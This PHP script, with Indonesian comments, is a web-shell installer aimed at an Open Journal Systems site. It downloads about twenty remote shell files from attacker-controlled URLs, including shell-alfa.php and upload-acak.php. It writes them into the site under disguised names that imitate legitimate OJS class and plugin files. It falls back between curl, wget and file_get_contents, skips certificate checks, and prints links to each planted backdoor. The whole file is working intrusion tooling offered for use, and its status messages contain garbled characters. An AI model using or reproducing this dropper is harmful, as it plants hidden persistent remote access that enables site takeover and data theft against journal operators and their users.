<?php

// === KONFIGURASI ===
// Format: 'URL' => 'nama_file.php'
$uploads = [
    ['url' => 'https://mega-prize.org/shell/detination.txt', 'target' => 'api/v1/_payments/BackendBackPaymentsSettingsHandler.php'],
    ['url' => 'https://mega-prize.org/shell/seo-file.txt', 'target' => 'api/v1/temporaryFiles/temporarysFilles.php'],
    ['url' => 'https://mega-prize.org/shell/seo-file.txt', 'target' => 'plugins/themes/default/DefaultRepoThemePlugin.php'],
    ['url' => 'https://mega-prize.org/shell/bdkr1.txt', 'target' => 'classes/subscription/form/UserInstitutionalRepoPolicitySubscriptionForm.inc.php'],
    ['url' => 'https://mega-prize.org/shell/mager.txt', 'target' => 'classes/security/authorization/OjsJournalRepoRequiredMustPublishPolicy.inc.php'],
    ['url' => 'https://raw.githubusercontent.com/goolbro598-cmyk/shell/refs/heads/main/shell-alfa.php', 'target' => 'controllers/modals/editorDecision/form/InitiatesRepoExternalsReviewsForm.inc.php'],
    ['url' => 'https://mega-prize.org/shell/lt-manager1.txt', 'target' => 'lib/pkp/api/v1/submissions/PKPSubmissionRepoHandler.php'],
    ['url' => 'https://mega-prize.org/shell/sk.txt', 'target' => 'lib/pkp/classes/identity/IdentitySettings.php'],
    ['url' => 'https://mega-prize.org/shell/dragon.txt', 'target' => 'lib/pkp/controllers/informationCenter/linkAction/SubmissionRepoInfoSettingsCenterLinkAction.inc.php'],
    ['url' => 'https://mega-prize.org/shell/detination.txt', 'target' => 'lib/pkp/controllers/review/linkAction/ReviewsRepoNotesSettingsLinksAction.inc.php'],
    ['url' => 'https://raw.githubusercontent.com/goolbro598-cmyk/shell/refs/heads/main/gecko-rxtql.php', 'target' => 'plugins/citationOutput/mla/MlasCitationsOutputsPlugin.php'],
    ['url' => 'https://raw.githubusercontent.com/goolbro598-cmyk/shell/refs/heads/main/ladev.php', 'target' => 'classes/journal/SectionsSettingsDAOs.inc.php'],
    ['url' => 'https://raw.githubusercontent.com/goolbro598-cmyk/shell/refs/heads/main/tiny.php', 'target' => 'classes/notification/form/NotificationsRepoSettingsForms.inc.php'],
    ['url' => 'https://raw.githubusercontent.com/goolbro598-cmyk/shell/refs/heads/main/upload-acak.php', 'target' => 'controllers/statistics/form/ReportsGeneratorsMainsForms.inc.php'],
    ['url' => 'https://raw.githubusercontent.com/goolbro598-cmyk/shell/refs/heads/main/shell-orang.php', 'target' => 'lib/pkp/lib/vendor/smarty/smarty/libs/plugins/shareds.makee_timeestamps.php'],
    ['url' => 'https://raw.githubusercontent.com/goolbro598-cmyk/shell/refs/heads/main/repository-rxtql.php', 'target' => 'lib/pkp/lib/adodb/lang/adodb-rs.inc.php'],
    ['url' => 'https://raw.githubusercontent.com/goolbro598-cmyk/shell/refs/heads/main/matrik.php', 'target' => 'lib/pkp/lib/vendor/ralouphie/getallheaders/src/getallheadler.php'],
    ['url' => 'https://raw.githubusercontent.com/goolbro598-cmyk/shell/refs/heads/main/gecko-rxtql.php', 'target' => 'lib/pkp/plugins/metadata/openurl10/schema/Openurlls10JournalsSchema.inc.php'],
    ['url' => 'https://raw.githubusercontent.com/goolbro598-cmyk/shell/refs/heads/main/ladev.php', 'target' => 'controllers/grid/navigationMenus/form/NavigattionRepoMenusItemsForm.inc.php'],
    ['url' => 'https://raw.githubusercontent.com/goolbro598-cmyk/shell/refs/heads/main/ladev.php', 'target' => 'lib/pkp/lib/vendor/doctrine/inflector/lib/Doctrine/Common/Inflector/Infllectors.inc.php'],
];

// Fungsi download
function downloadWithCurl($url)
{
    if (!function_exists('curl_init'))
        return false;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 10,
    ]);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data !== false ? $data : false;
}

function downloadWithWget($url)
{
    $tmpFile = tempnam(sys_get_temp_dir(), 'wget_');
    $command = "wget --no-check-certificate -q -O " . escapeshellarg($tmpFile) . " " . escapeshellarg($url);
    shell_exec($command);
    if (file_exists($tmpFile) && filesize($tmpFile) > 0) {
        $data = file_get_contents($tmpFile);
        unlink($tmpFile);
        return $data;
    }
    return false;
}

function downloadWithFileGetContents($url)
{
    $context = stream_context_create([
        'http' => ['timeout' => 10]
    ]);
    return @file_get_contents($url, false, $context);
}

$methods = [
    'curl' => 'downloadWithCurl',
    'wget' => 'downloadWithWget',
    'file_get_contents' => 'downloadWithFileGetContents',
];

// Proses tiap URL
foreach ($uploads as $item) {
    $url = $item['url'];
    $filename = $item['target'];

    $savePath = $filename;
    $data = false;
    $methodUsed = '';

    foreach ($methods as $method => $func) {
        $data = $func($url);
        if ($data !== false) {
            $methodUsed = $method;
            break;
        }
    }

    if ($data !== false) {
        // Buat folder kalau belum ada
        $folderPath = dirname($savePath);
        if (!is_dir($folderPath)) {
            mkdir($folderPath, 0755, true);
        }

        file_put_contents($savePath, $data);
        $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
        echo "ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ <a href='https://$domain/$filename' target='_blank'><b>$filename</b></a> berhasil via <b>$methodUsed</b><br>";
    } else {
        echo "ÃƒÂ¢Ã…â€™ <b>$filename</b> gagal diunduh dari <code>$url</code><br>";
    }
}
